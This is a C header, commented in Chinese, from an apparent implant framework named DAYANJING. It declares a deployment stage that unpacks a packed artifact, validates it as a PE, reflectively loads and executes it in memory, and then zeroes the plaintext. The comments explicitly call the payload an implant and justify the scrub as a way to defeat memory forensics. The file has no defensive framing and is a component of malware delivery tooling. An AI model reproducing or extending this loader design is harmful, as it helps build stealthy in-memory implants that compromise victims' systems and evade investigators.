/*
 * 25_deploy/include/drop_pe.h
 *
 * 投送侧 PE 载荷路径 —— 把 25_deploy 解出的制品接进反射装载。
 *
 * 分工（本层不重复实现任何一层）：
 *   25_deploy/drop.c   制品分块接收、组装、摘要校验
 *   20_packer          pk_unpack_shaped（制品 -> 明文，无损）
 *   17_loader          pe_parse / reflect_load（头解析、映射、重定位、IAT）
 *   agent_windows      rr_load_run（节区权限 / TLS / 入口三步）
 *   本层               解包重试、PE 校验、region 需求报告、装载执行、明文擦除
 *
 * 为什么必须有"明文擦除"这一步：
 *   反射装载执行完会返回到调用方（不像 mexec 那样替换进程映像），于是
 *   解包缓冲里那份完整明文植入体会一直留在堆上。它既是内存取证的直接
 *   目标，也让进程内同时存在两份植入体映像（region 一份、缓冲一份），
 *   其中一份还带着尚未设权的权限状态。装载完成后必须显式清零。
 *
 * 为什么"解包"与"执行"分成两个函数：
 *   调用方需要先知道 region 要多大（pe_virtual_size）才能分配。若合并成
 *   一个函数，就只能由本层代分配，而 Windows 侧必须是 VirtualAlloc，
 *   Linux 侧是 mmap —— 把平台分配器塞进这一层会让它不再平台无关。
 */
#ifndef DAYANJING_DEPLOY_DROP_PE_H
#define DAYANJING_DEPLOY_DROP_PE_H

#include "drop.h"
#include "reflect_run.h"

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* 本层错误码沿用 drop.h 的 DP_ERR_*；以下为 PE 路径新增，从 -40 起 */
#define DP_ERR_PE       -40   /* 解包成功，但内容不是合法 PE */
#define DP_ERR_REGION   -41   /* region 小于 pe_virtual_size */
#define DP_ERR_NOHOOK   -42   /* rr_hooks 缺失，拒绝降级执行 */

/* 解包结果：调用方据此分配 region */
typedef struct {
    size_t   raw_len;       /* 解包后明文长度 */
    size_t   region_need;   /* 需要的 region 大小 = pe_virtual_size */
    uint16_t machine;       /* IMAGE_FILE_MACHINE_* */
    int      is_dll;        /* COFF Characteristics & IMAGE_FILE_DLL */
} dp_pe_info_t;

/* 装载执行结果 */
typedef struct {
    uint32_t n_reloc;
    uint32_t n_import;
    uint32_t n_sections;    /* 完成设权的节区数 */
    size_t   n_tls;
    int      is_dll;
    int      entry_invoked;
    int      reflect_rc;    /* rr_load_run 原始返回码 */
} dp_pe_result_t;

/*
 * 解包制品并校验其为合法 PE，报告所需 region 大小。
 *   不装载、不执行、不产生任何代码页。
 * out/io_cap：出参缓冲；*io_cap 传入容量，返回实际明文长度。
 * 返回 DP_OK 成功；非容量类解包失败返回 DP_ERR_DIGEST（不泄露具体原因）。
 */
int dp_asm_unpack_pe(const dp_asm_t *a, const uint8_t *seed, size_t seed_len,
                     uint8_t *out, size_t *io_cap, dp_pe_info_t *info);

/*
 * 在已分配的 region 上反射装载并运行。
 *   region 必须先可写（reflect_load 要写入），最终权限由 protect 回调逐节设定。
 *   返回 DP_OK 表示入口（或至少 TLS）确已执行。
 *   失败时返回本层错误或透传 rr_load_run 的负值。
 */
int dp_pe_run(const uint8_t *pe, size_t pe_len,
              uint8_t *region, size_t region_size,
              const rr_hooks_t *rh, dp_pe_result_t *out);

/*
 * 清零明文缓冲。装载成功后必须调用 —— 见文件头说明。
 */
void dp_pe_scrub(uint8_t *buf, size_t len);

const char *dp_pe_errstr(int rc);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_DEPLOY_DROP_PE_H */
